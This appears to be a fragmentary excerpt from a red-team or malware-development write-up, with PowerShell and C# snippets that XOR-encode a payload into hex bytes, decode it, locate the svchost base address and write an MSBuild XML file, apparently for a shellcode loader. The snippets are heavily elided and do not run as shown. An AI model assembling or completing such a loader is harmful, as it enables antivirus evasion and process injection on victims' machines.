...
function encode-text ($plaintext, $key)
{
    ...
    for($i = 0; $i -lt $plaintext.length; $i++){
        $decimalxor = $plaintext[$i] -bxor $Key
        $hexxor = "{0:x}" -f $decimalxor
        if($i -ne $plaintext.length -1){
        $cyphertext += "0x$hexxor, "}
        else{$cyphertext += "0x$hexxor"}
        }
    return $cyphertext
}
...
string[] namesArray = s.Split(',');
					byte[] xord = new byte[namesArray.Length];
					for (int i =0; i <= namesArray.Length -1; i++){
					xord[i] = Convert.ToByte(namesArray[i].Replace(" ", ""), 16);}
                ...
                using (SHA1 sha1hash = SHA1.Create())
                {
					...
					IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuff, 0));
...
$XMLHEAD |Out-File C:\users\rvauser\Desktop\msbuildtest.xml